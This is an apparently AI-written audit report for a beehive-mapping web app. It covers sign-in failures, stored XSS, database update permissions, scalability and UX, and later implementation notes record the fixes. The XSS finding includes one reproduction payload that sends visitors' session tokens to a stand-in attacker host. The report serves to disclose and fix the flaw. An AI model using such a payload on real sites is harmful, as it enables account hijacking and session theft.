# Fable Audit Findings — Errors, Security, Scalability, Sign-in, Live UX

**Written:** July 23, 2026, by Claude Fable 5, in a dedicated Cowork audit session
**For:** Ronnie → hand to a Sonnet session for implementation
**Scope:** Audit only. Nothing here was fixed or deployed. No code was changed; `CACHE_VERSION` untouched (still v2.9.4).
**Method:** Full read of `app.js` (2236 lines), `sw.js`, `index.html`, the SQL files, plus a live hands-on walkthrough of savethehives.org in Chrome (double-loaded first per the SW two-load rule) and an OG-tag check via Facebook's Sharing Debugger.

**Read this first — two things I did to your live environment:**
1. **You are signed out.** To inspect the sign-in modal + Turnstile widget (Priority 5 asked for it) I had to sign out of your account in the browser I was driving. Sign back in with a magic link when convenient.
2. I confirmed the Open Graph card renders correctly in Facebook's debugger (details in P5).

**Severity key:** 🔴 Critical · 🟠 High · 🟡 Medium · ⚪ Low · 💡 Suggestion (not a bug)

**Verification legend:** ✅ Confirmed in code/live · 🔍 Needs dashboard access (yours) to confirm — steps at the bottom.

---

## Priority 1 — Sign-in reliability

### Root context: the Supabase client is created with all defaults
`app.js:17` — `const db = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);`

No options object. That means `persistSession: true`, `autoRefreshToken: true`, the default `storageKey`, and — critically — the default cross-tab **Web Lock** (`navigator.locks`, keyed `lock:sb-<projectref>-auth-token`). This one line is the substrate under the recurring failure. I confirmed the persistence live: the browser I tested in still had your session, and clicking **Add** dropped me straight into the form without a sign-in prompt — `autoRefreshToken` + `persistSession` are demonstrably active.

### 1a. 🟠 Cross-tab / stale-tab Web Lock contention — this is the most likely cause of the recurring failure ✅ (mechanism confirmed in code; behavioral confirmation needs your logs)

Your Jul 23 lead ("closing stale tabs fixed it") maps almost exactly onto a well-documented class of supabase-js bugs. With the default lock, auth calls (`signInWithOtp`, `getSession`, token refresh) each acquire the same origin-wide Web Lock. A stale tab sitting on an expired/invalid session runs `autoRefreshToken` in the background; if its refresh stalls or the lock is orphaned, a **fresh `signInWithOtp()` in another tab awaits a lock it can't get**, and the call hangs or resolves without the email actually going out. That is a precise fit for "no client-side error shown, no email arrived."

This is not theoretical — it's the same failure mode reported across multiple upstream issues:
- supabase-js #2013 (auth deadlock), #2111 (browser client auth methods hang on orphaned Web Locks), #1517 (`NavigatorLockAcquireTimeoutError`), #35754 (`getUser()` hangs after inactivity), discussion #35069 (multiple-tab session issues).

**Compounding factor:** `index.html:299` loads Supabase from CDN **unpinned** — `@supabase/supabase-js@2`. The exact lock behavior can drift under you on any patch release without a code change. Pin a known-good version.

**Recommendations (for the Sonnet session to weigh, roughly in order):**
1. **Pin supabase-js** to a specific version (e.g. `@supabase/supabase-js@2.x.y`) rather than floating `@2`, so behavior is reproducible.
2. Consider passing an explicit `auth` config. Two levers:
   - A custom `lock` (a no-op lock) bypasses `navigator.locks` entirely and makes the deadlock impossible — but reintroduces the token-refresh race the lock was added to prevent. Acceptable for a low-write app like this; document the tradeoff.
   - Or keep the lock but be more deliberate about `autoRefreshToken` (e.g. only start it when a session actually exists).
3. **UX mitigation regardless of which fix lands:** detect other open tabs via a `BroadcastChannel` and show a one-line toast ("SaveTheHives is open in another tab — close it if sign-in isn't working"). Cheap, honest, and directly addresses the observed real-world trigger. This is worth doing even if the "real" fix is just documentation.

### 1b. 🟠 `emailRedirectTo` carries the query string — collides with the new `?tab=` deep links ✅

`app.js:1410` — `const otpOptions = { emailRedirectTo: window.location.href, captchaToken };`

`window.location.href` includes the full query string. The `?tab=` deep-link feature shipped the **same day** (v2.9.3), and your Facebook posts now link to URLs like `savethehives.org/?tab=learn`. If a visitor lands via such a link and signs in, `emailRedirectTo` becomes `https://savethehives.org/?tab=learn`. Your Supabase Redirect URL allowlist (spec §10) is exact entries only — `https://savethehives.org`, `https://www.savethehives.org`, `http://localhost:8080` — with no wildcard. Supabase validates the redirect against that allowlist; a URL with an unlisted query string can be rejected or silently downgraded to the Site URL, producing "clicked the link, still not signed in."

Note this is a **different failure mode** than 1a: it breaks the *click-through*, not the *send*. But it's newly relevant precisely because of the FB launch, so it deserves attention now.

**Recommendation:** strip query/hash before using as redirect — `emailRedirectTo: window.location.origin + window.location.pathname` — **and** add `https://savethehives.org/**` and `https://www.savethehives.org/**` (wildcard) to Supabase → Authentication → URL Configuration → Redirect URLs. Do both; they're independent safety nets.

### 1c. 🟡 No re-entrancy guard on `submitSignIn()` — double-submit can burn the OTP cooldown ✅

`app.js:1392`. The submit button is disabled at `:1399`, but there are **two** entry points: the button `onclick` and the email field's Enter handler (`index.html:834`, `onkeydown … submitSignIn()`). `getTurnstileToken()` is `await`ed and can take up to 15s. Nothing stops a second invocation (two quick Enter presses, or Enter + click) from running its own `getTurnstileToken()` and firing a second `signInWithOtp()`. Two OTP requests in quick succession hit Supabase's ~60s resend cooldown; the second **silently no-ops or errors**, which can read to the user as "it did nothing." This is one of the exact symptoms in spec §11's theory (c).

**Recommendation:** add a module-level `let _signInInFlight = false;` guarded at the top of `submitSignIn()` (return early if true; reset in a `finally`).

### 1d. ⚪ Cached Turnstile token reuse ✅
`app.js:1345` — `getTurnstileToken()` resolves an already-cached `_turnstileToken` immediately. Turnstile tokens are single-use and short-lived; a cached token from a prior modal open could be sent stale and rejected server-side (looks like a silent failure). The `expired-callback` nulls it, which mostly covers this, but a token used twice within its lifetime would still be rejected on the second use. Low frequency; worth a note. Consider always nulling `_turnstileToken` after a successful `signInWithOtp` submit.

---

## Priority 2 — Security

### 2a. 🔴 Stored XSS — confirmed, multiple render paths ✅

No escaping exists anywhere (grep for `DOMPurify`/`escapeHtml`/`sanitize` across `app.js` → zero hits). User-submitted fields are interpolated raw into HTML via `innerHTML` / `bindPopup`:

| Render path | File / line | Unescaped fields |
|---|---|---|
| Hive popup | `app.js:426–445` (`addMarker`, `bindPopup`) | `hive.name`, `desc` (`hive.description`), `loc` (from `city`/`state`) |
| Records list | `app.js:802–819` (`openRecords`, `list.innerHTML`) | `h.name`, `h.description`, `loc` |
| Ideas list | `app.js:858–874` (`renderIdeas`) | `idea.title`, `idea.description` (admin-seeded today — lower risk, but same pattern) |

**Reproduction:** any signed-in user submits a hive whose **name** or **description** is
`<img src=x onerror="fetch('https://evil.example/?c='+encodeURIComponent(localStorage.getItem('sb-nsujmizdawyoictpawxt-auth-token')))">`.
`<script>` won't run via `innerHTML`, but the `onerror` handler will — in **every** visitor's browser that opens that hive's popup or sees it in the records list. The asset at risk is **each visitor's Supabase session token in `localStorage`** (not the anon key, which is meant to be public). With that token an attacker can act as the victim.

**Scope note — one path is already safe:** the *most-recent-checkin note* in the popup is written with `el.textContent` (`app.js:459`), so it does **not** execute. Good. The vulnerable fields are name/description (both popup and records list) and the city/state that build `loc`.

**Contributing factor:** the Add form has **no `maxlength`** on `form-name` or the `form-desc` textarea (`index.html:658, 668`), so payload size is unconstrained.

**Recommended fix:** add a tiny `escapeHtml()` helper and run `name`, `description`, `city`, `state`, `zip` through it before interpolation in both `addMarker` and `openRecords` (and `renderIdeas` for future-proofing). Where no HTML is needed, prefer building nodes with `textContent`. Do **not** pull in a heavy sanitizer — a 5-line escape function covers every path here. This is the single highest-priority code fix in the report and should land before the 188 invites go out.

> **Implementation-session addendum (2026-07-23, Sonnet session):** Shipped in v2.9.5 — `escapeHtml()` added and applied to `name`/`description`/`loc` (city+state) in both `addMarker` and `openRecords`, plus `idea.title`/`idea.description` in `renderIdeas`. **Deviation from the recommendation above: `zip` was NOT escaped.** Grep confirmed `hive.zip` is never interpolated into `innerHTML`/`bindPopup` anywhere in `app.js` today — its only uses are string-matching in search (`doSmartSearch`, ~app.js:1167) and the `notifyHiveChanged`-style change-detection join (~app.js:1556). There is currently no render path for it to exploit. **Flagging for the next Fable review to re-examine:** confirm this is still true after any future feature work (e.g. if `zip` is ever added to a popup/records template), and re-add escaping at that point if so. Also added `maxlength` to `form-name` (200) and `form-desc` (1000) in `index.html`, which the original finding called out as a contributing factor.

### 2b. 🟠 Any signed-in user may be able to overwrite *any* hive — verify the `hives` UPDATE policy 🔍

Spec §10 states the `hives` UPDATE policy is "Signed-in only." If that policy is literally `USING (auth.role() = 'authenticated')` with **no** `submitted_by = auth.uid()` ownership check, then any signed-in account can UPDATE any of the 1,152 legacy rows — name, description, coordinates. **Combined with 2a**, that means the XSS isn't limited to hives an attacker created: they could inject a payload into the most-viewed existing pins. I can't see the actual policy from client code, so this is flagged for dashboard verification, but the combination is why 2a is Critical.

> **Implementation-session addendum (2026-07-23, Sonnet session):** Confirmed via dashboard — the policy `hives_auth_update` was literally `using (true) with check (true)` for `authenticated`, i.e. the worst case. Also confirmed by grep that the live `app.js` never calls a direct `hives` UPDATE at all (only `select`/`insert` — the only UPDATE path was through `submit_checkin()`), so the permissive policy served no actual app function; it was pure exposure. **Deviation from the recommendation above:** simply owner-scoping the raw policy (`submitted_by = auth.uid()`) as suggested would have silently broken check-ins on any hive the checking-in user didn't submit — which is nearly all of them, since `submit_checkin()` (`v2_6_sync.sql:57`) was `SECURITY INVOKER` and its internal `UPDATE hives` runs under the *caller's* RLS. Checking in on a legacy hive (`submitted_by = null`) or anyone else's hive would still log the check-in row but silently fail to update the hive's `status`/`last_verified_at` (0 rows matched, no error) — undermining Validate's core purpose. **Actual fix shipped:** (1) tightened `hives_auth_update` to `submitted_by = auth.uid()` in both `USING`/`WITH CHECK`; (2) converted `submit_checkin()` to `SECURITY DEFINER` with a pinned `search_path` so its internal update bypasses the now-stricter policy and keeps working for any hive; (3) since `SECURITY DEFINER` bypasses RLS for the whole function body (including the `checkins` insert), also revoked the RPC's `anon` execute grant and added an explicit `auth.uid() is null` guard inside the function, to avoid quietly reopening the anonymous-checkin hole v2.9.1 had fixed. **Flagging for the next Fable review:** re-verify the `submit_checkin()` grants (`authenticated` only, not `anon`) and the `search_path` pin stay intact across any future migration that touches this function.

Nuance for whoever fixes it: check-in status updates go through the `submit_checkin` RPC (SECURITY INVOKER, `v2_6_sync.sql:57`), which updates `hive.status`/`last_verified_at` server-side — so the *direct* client UPDATE policy may be broader than the app actually needs. Legacy rows have `submitted_by = null`, so an owner-scoped policy (`submitted_by = auth.uid()`) would lock all legacy records to no-one (good), while still letting the RPC do status updates. Verify and tighten. **See dashboard checklist.**

### 2c. ✅ No leaked secrets beyond the (expected) anon key
`app.js:16` exposes the Supabase **anon** key — that's normal and correct with RLS; not a finding. I found nothing else that shouldn't be client-visible: the Turnstile **secret** key is not in the code (site key `0x4AAAAAADtgqmkUZOmib37k` only, which is public by design), and the Resend API key is not present (it lives in Supabase SMTP settings). Clean.

### 2d. 🟡 PII in public data — confirmed live (policy matter, not a code bug) ✅/🔍
Observer names are publicly readable in popups — I saw a real full name ("Steve Sherwood") on a live pin during the walkthrough. Spec §9/§11 already notes legacy free-text notes contain incidental PII (phone numbers, "email me"). Not asking you to fix it — but if you want the exact scope before the traffic bump, run the count query in the dashboard checklist.

### 2e. 🔍 Turnstile provider still set to Turnstile (not hCaptcha)
Can't be checked from the client — the historical gotcha (Supabase's captcha dropdown defaulting to hCaptcha) lives entirely in the dashboard. Since sign-in worked at all in the past, it's *probably* still correct, but verify while you're in there (checklist below).

---

## Priority 3 — Scalability

### 3a. 🟡 SW caches unpinned CDN libraries cache-first ✅
`sw.js:105–116` caches CDN scripts (Leaflet, MarkerCluster, **supabase-js@2**) cache-first, opportunistically. Combined with the unpinned `@2` (1a), once a visitor has cached a given supabase-js build they keep it until `CACHE_VERSION` bumps *and* they two-load. That's fine while your `CACHE_VERSION` discipline holds, but it means "pin the version" (1a) also improves cache determinism. Tile cache is FIFO-capped at 200 (`sw.js:10, 66`) — good, no unbounded growth.

### 3b. ⚪ Popup opens issue one checkin query each ✅
`app.js:452` — each popup open fires a `checkins` query for the latest note, guarded by `dataset.loaded` so it's once-per-marker. Not a true N+1 (not in a loop), fine at current scale. At high concurrent traffic it's many small queries; acceptable, noted for awareness. An alternative later would be to fetch latest-note-per-hive in the bulk load, but not worth it now.

### 3c. 🟡 Every hive becomes a live marker; radius overlay is one circle per visible hive ✅
`loadHivesFromSupabase` adds all rows to the cluster group (MarkerCluster handles this well). The scaling pressure is the **radius overlay**: `toggleRadii`/`reapplyFilters` (`app.js:500, 546, 1570`) create one `L.circle` per *visible* hive. At 1,000+ visible that's 1,000+ vector layers — this is the low-end-device concern already logged in spec §11; I'm confirming it's real in the code, not adding a new one. The delta-sync/IndexedDB layer itself is sound (keyed by `id`, `updated_at` cursor).

### 3d. ⚪ Delta-sync cursor is strictly-greater — millisecond-boundary skip ✅
`app.js:322` uses `.gt('updated_at', lastSync)` and `latestUpdatedAt` advances the cursor to the max seen. Two rows written in the *same* millisecond as the cursor boundary could be skipped on the next sync (one is `> cursor`, one is `== cursor`). Vanishingly rare at your write volume; note only. A defensive fix is `.gte` plus client-side dedupe by `id`.

### 3e. ⚪ Known items confirmed, not re-flagged
Records list first-50 cap (`app.js:801`) and `honeybee-on-comb.jpg` still in the SW precache list while unreferenced (`sw.js:26`) — both already in spec §11. Confirmed present, not new.

---

## Priority 4 — General error handling

### 4a. 🟡 First-ever load failure is silent — empty map, no error, no retry ✅
`app.js:348–356`: the first-load pagination loop `break`s on error with no toast; `showToast('… hives loaded')` only fires on success. If the very first load fails (no cache yet — a brand-new visitor on a flaky connection, i.e. exactly your incoming FB traffic), they see an **empty map with no explanation**. The delta-sync path (`:323`) at least warns to console and keeps cached data, but the cold path has nothing.
**Recommendation:** distinguish "loaded 0 because empty" from "loaded 0 because the fetch errored," and show a toast + a retry affordance in the error case.

### 4b. ⚪ `submitHive` has no try/catch around the insert ✅
`app.js:758–794`: relies on the returned `{ error }`, which covers Supabase's normal error path, but a thrown network exception (offline mid-submit) isn't caught, so the button could stick on "Saving…". `submitCheckin` (`:1467`) and the search functions handle this better.
**Recommendation:** wrap the insert in `try/catch/finally`, restoring the button in `finally`.

### 4c. ⚪ No global `unhandledrejection` handler ✅
There's no `window.addEventListener('unhandledrejection', …)`. Given several `async` functions `await` without local `catch` (e.g. `voteIdea` at `:877`, `loadIdeas`' inner calls), a stray rejection vanishes into the console. Consider a global handler that at least logs, optionally toasts. Low priority.

### 4d. ✅ Things that are actually fine
`submitCheckin` restores its button in all branches; `doSmartSearch`/`doSearch` both have `.catch`; the IndexedDB wrappers all try/catch and degrade to full-fetch. The offline-write gap is known/shelved (spec §11) — not re-flagged, and I confirmed the app's offline behavior is "fail with a toast," by deferral, as documented.

---

## Priority 5 — Live UX walkthrough (Chrome)

Walked the live site as a first-time visitor after double-loading. Overall it presents very well — the map, popups, Learn reader, About modal, dark mode, and sign-in modal all render cleanly and I saw **no runtime console errors** during interaction.

### Bugs / issues

- **5a. 🟡 Map doesn't reflow to fill the viewport after a window resize.** ✅ After the browser window changed size mid-session, the Leaflet map stayed at its old dimensions, leaving a large blank grey area to the right and below (see repro: it happened every time the viewport dimensions changed). `map.invalidateSize()` is only called inside `setTab('map'|'validate')` (`app.js:1055`), not on `window.resize`/`orientationchange`. **This app is mobile-first and iPhone rotation is a resize** — a user who rotates their phone, or a desktop user who resizes, can land on a half-rendered map. Recommend a `window.addEventListener('resize'/'orientationchange', debounce(() => map.invalidateSize()))`. Worth confirming on a real iPhone since that's your primary target.
- **5b. ⚪ Could not verify the first-visit on-ramp overlay cold.** The test browser already had `onrampSeen` in `localStorage` (and a persisted session), so the overlay never appeared. Please check it yourself in a private/incognito window before the invite send — it's the literal first impression for all 188 people.

### Open Graph verification (v2.9.4) — ✅ working

Ran `https://savethehives.org/` through Facebook's Sharing Debugger:
- **Response code 200**, scraped fresh.
- **Link preview renders correctly**: title "SaveTheHives — Feral Honeybee Mapping Network", description "Citizen-science mapping of wild honey bee colonies. Find one, log it, help track survivors — no experience needed.", and the watercolor bee/oak image (`facebook_cover_photo.jpg`).
- Parsed `og:url`, `og:type=website`, `og:title`, `og:description`, `og:image`, `og:image:alt`, and `twitter:card=summary_large_image` all present and correct.
- **Only warning:** `Missing Properties: fb:app_id` — cosmetic, optional, does not affect the card. (💡 5c: add an `fb:app_id` meta only if you want to silence it — otherwise ignore.)
- 💡 Minor curiosity: FB parsed the Twitter tags under an `og:temporal:twitter:*` namespace. The card renders fine, so this is cosmetic, but if a Sonnet session is in `index.html` anyway it's worth a glance that the `twitter:*` `<meta name=…>` tags aren't nested oddly.

**Your card is good to share.** No blocker here.

### UX suggestions (not bugs — triage separately)

- **💡 5d.** The invisible Turnstile gives no visible feedback while it runs; the button's "Sending…" state covers the gap adequately, but on a slow network (your Pi-hole scenario) a user waits up to 15s with only "Sending…". Consider a sub-label like "running a quick security check…" after ~3s so it doesn't read as a hang.
- **💡 5e.** Popups expose observer full names publicly (see 2d). If you ever want to soften that without a schema change, first-name-plus-initial rendering is a client-only change.
- **💡 5f.** The install nudge ("Install SaveTheHives") shows on desktop Chrome via `beforeinstallprompt` and renders the iOS manual-steps text on iPhone — both worked as designed.

---

## What I need you to check (dashboard access — I can't reach these)

I could only read the client side. These need your login; paste back what you find and a Sonnet session can act on it.

**Resend (resend.com → Emails / Logs):** For the Jul 23 failed sign-in window specifically —
- Did an email to your address even get **created/attempted**? (If there's no log entry at all, the failure is upstream of Resend — points at 1a/1c, i.e. the request never reached Supabase's mailer.)
- If it was attempted, what's the **status** — delivered, bounced, deferred, complained? (A bounce/defer points at deliverability; a "delivered" that you never saw points at spam.)
- Confirm the **domain is Verified** and SPF, DKIM, and DMARC all show green (not just present).

**Supabase → Authentication → Logs:** for the same window —
- Is there a `signInWithOtp` / OTP request logged at all? (No entry ⇒ the client never completed the call ⇒ strongly supports the 1a Web-Lock-hang theory.)
- Any rate-limit / cooldown / captcha-rejection entries? (Supports 1c or a Turnstile misconfig.)

**Supabase → Authentication → URL Configuration:**
- Add `https://savethehives.org/**` and `https://www.savethehives.org/**` (wildcard) to **Redirect URLs** (fixes 1b's click-through path). Keep the existing exact entries too.

**Supabase → Authentication → Attack Protection:**
- Confirm Captcha provider = **Turnstile by Cloudflare** (not hCaptcha) — the 2e/known dropdown gotcha.

**Supabase → Database → Policies (or SQL editor), `hives` table:**
- Look at the **UPDATE** policy expression. If it's just `authenticated` with no `submitted_by = auth.uid()` check, that's finding **2b** — any signed-in user can edit any hive. Decide whether to scope it to owners (legacy rows have `submitted_by = null`, so owner-scoping locks them down while the `submit_checkin` RPC still handles status updates).

**Supabase → SQL editor, PII scope (optional, for 2d):**
```sql
-- how many legacy notes contain a phone-number-ish or "email" pattern
select count(*) from public.hives
where notes ~ '\d{3}[-.\s]?\d{3}[-.\s]?\d{4}'
   or notes ilike '%email%' or notes ilike '%@%';
```

---

## Suggested fix order for the Sonnet session

1. **2a stored XSS** (add `escapeHtml`, apply to popup + records list; add `maxlength` to the form) — before the invite send.
2. **2b hives UPDATE policy** — verify/tighten in the dashboard (amplifies 2a).
3. **1b `emailRedirectTo` + Redirect URL wildcard** — quick, and directly tied to the FB `?tab=` launch.
4. **1a pin supabase-js + multi-tab toast** — the recurring sign-in cause.
5. **1c submit re-entrancy guard.**
6. **4a cold-load error toast**, **5a resize→invalidateSize**, then the low/⚪ items.

Remember: any commit touching `app.js`/`index.html`/`styles.css`/`sw.js` must bump `CACHE_VERSION` in `sw.js`, and after the push you'll need to reload twice (or close/reopen the tab) before the change is actually live.
